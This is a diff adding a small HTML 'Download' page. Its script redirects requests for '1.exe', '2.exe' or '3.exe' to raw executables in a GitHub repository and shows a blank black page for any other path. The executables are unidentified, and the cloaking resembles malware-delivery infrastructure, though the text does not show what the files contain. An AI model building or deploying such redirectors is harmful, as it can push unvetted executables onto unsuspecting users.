@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Download</title>
+</head>
+<body>
+<script>
+    // Get the filename from the URL path
+    const path = window.location.pathname;
+    const filename = path.split('/').pop();
+    
+    // Valid files
+    const validFiles = ['1.exe', '2.exe', '3.exe'];
+    
+    if (validFiles.includes(filename)) {
+        // Redirect to GitHub raw file
+        window.location.href = `https://github.com/voidpardoxco/g/raw/refs/heads/master/${filename}`;
+    } else {
+        // Show blank page for other requests
+        document.body.style.backgroundColor = '#000000';
+    }
+</script>
+</body>
+</html>
